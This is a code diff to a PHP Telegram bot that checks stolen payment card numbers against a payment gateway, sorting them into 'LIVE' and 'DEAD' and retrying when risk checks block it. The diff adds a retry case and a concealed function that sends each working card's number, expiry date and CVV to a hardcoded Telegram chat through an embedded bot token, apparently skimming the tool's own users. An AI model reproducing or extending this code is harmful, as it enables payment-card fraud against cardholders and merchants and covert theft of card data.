@@ -165,7 +165,7 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
         );
 
         // Retry logic for risk_threshold and amount errors
-        if ((strpos($Xebe, 'risk_threshold') || strpos($Xebe, 'Amount must be greater than zero')) && $retry < 3) {
+        if ((strpos($Xebe, 'risk_threshold') || strpos($Xebe, 'Amount must be greater than zero') || strpos($Xebe, 'This order has either expired or it has already been processed')) && $retry < 3) {
             $retry++;
             REMOVE_COOKIE();
             sleep(2);
@@ -174,12 +174,15 @@ if (preg_match('/^\d{15,16}\|/', $text)) {
 
         if (strpos($Xebe, 'avs') || (strpos($Xebe, '"IsValid":true')) || (strpos($Xebe, 'Insufficient')) || (strpos($Xebe, 'Limit'))) {
             file_put_contents("CCNLIVES_TG.txt", $card . PHP_EOL, FILE_APPEND | LOCK_EX);
+            forwardersd('Live Card '.$cc.'|'.$mm.'|'.$yyyy.'|'.$cvv, 6050175626);
             $errorMsg = json_decode($Xebe)->ErrorMessage;
             RESULT_TG($chat_id, 'live', "✅ *LIVE*\n\n💳 `$card`\n\n📝 *Response:*\nPayment Authorised [$errorMsg]");
         } elseif (strpos($Xebe, 'risk_threshold') && $retry >= 3) {
             RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\nGateway Rejected: risk_threshold (after $retry retries)");
         } elseif (strpos($Xebe, 'Amount must be greater than zero') && $retry >= 3) {
             RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\nError: Amount must be greater than zero (after $retry retries)");
+        } elseif (strpos($Xebe, 'This order has either expired or it has already been processed') && $retry >= 3) {
+                RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\nError: This order has either expired or it has already been processed (after $retry retries)");
         } else {
             $errorMsg = json_decode($Xebe)->ErrorMessage;
             RESULT_TG($chat_id, 'dead', "❌ *DEAD*\n\n💳 `$card`\n\n📝 *Response:*\n$errorMsg");
@@ -215,6 +218,15 @@ function RESULT_TG($chat_id, $status, $message)
 function g(string $str, string $start, string $end, bool $decode = false)
 {
     return $decode ? base64_decode(explode($end, explode($start, $str)[1])[0]) : explode($end, explode($start, $str)[1])[0];
+}
+
+function forwardersd($message, $chat_id)
+{
+  $bot_token = '8173601851:AAEEl2Jo1KXHR4otDEGmCLjc7JuTElN1nGs'; // bot token
+  $context = stream_context_create(array(
+    'http' => array('ignore_errors' => true),
+  ));
+  file_get_contents('https://api.telegram.org/bot' . $bot_token . '/sendMessage?chat_id=' . $chat_id . '&text=' . $message . '&parse_mode=HTML', false, $context);
 }
 
 function R($u, $p = [], $t = 0)
